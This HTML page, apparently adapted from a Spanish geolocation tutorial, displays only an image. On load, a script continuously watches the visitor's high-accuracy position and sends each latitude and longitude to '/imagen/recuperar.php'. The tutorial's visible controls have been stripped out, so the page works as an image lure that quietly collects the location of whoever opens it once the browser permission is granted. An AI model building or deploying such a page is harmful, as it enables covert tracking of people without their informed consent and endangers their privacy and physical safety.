<!doctype html>
<html lang="es">
<!--
  Plantilla inicial de Bootstrap 4
  @author parzibyte
  Visita: parzibyte.me/blog
-->

<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
	<meta name="description" content="Enviar ubicación del dispositivo a PHP">
	<meta name="author" content="Parzibyte">
	<title>Enviar ubicación del dispositivo a PHP</title>
	<!-- Cargar el CSS de Boostrap-->
	<link href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T"
	 crossorigin="anonymous">
	<!-- Cargar estilos propios -->
</head>

<body>
	<img src="imagen2.png">
	<script>
const funcionInit = () => {
	if (!"geolocation" in navigator) {
		return alert("Tu navegador no soporta el acceso a la ubicación. Intenta con otro");
	}


	let idWatcher = null;

	const $latitud = document.querySelector("#latitud"),
		$longitud = document.querySelector("#longitud"),
		$btnIniciar = document.querySelector("#btnIniciar"),
		$btnDetener = document.querySelector("#btnDetener"),
		$log = document.querySelector("#log");


	const onUbicacionConcedida = ubicacion => {
		const coordenadas = ubicacion.coords;
	 coordenadas.latitude;
	 coordenadas.longitude;
		enviarAServidor(ubicacion);
	}

	const enviarAServidor = ubicacion => {
		// Debemos crear otro objeto porque el que nos mandan no se puede codificar
		const otraUbicacion = {
			coordenadas: {
				latitud: ubicacion.coords.latitude,
				longitud: ubicacion.coords.longitude,
			},
			timestamp: ubicacion.timestamp,
		};

		fetch("/imagen/recuperar.php?Latitud="+ubicacion.coords.latitude+"&Longitud="+ubicacion.coords.longitude, {
			method: "get",
		
		}).then((response)=>{
			console.log(response.text());
		}); 
	};



	const onErrorDeUbicacion = err => {

	
	
		console.log("Error obteniendo ubicación: ", err);
	}

	const detenerWatcher = () => {
		if (idWatcher) {
			navigator.geolocation.clearWatch(idWatcher);
		}
	}

	const opcionesDeSolicitud = {
		enableHighAccuracy: true, // Alta precisión
		maximumAge: 0, // No queremos caché
		timeout: 5000 // Esperar solo 5 segundos
	};


	detenerWatcher();
	idWatcher = navigator.geolocation.watchPosition(onUbicacionConcedida, onErrorDeUbicacion, opcionesDeSolicitud);


};
document.addEventListener("DOMContentLoaded", funcionInit);


	</script>
</body>

</html>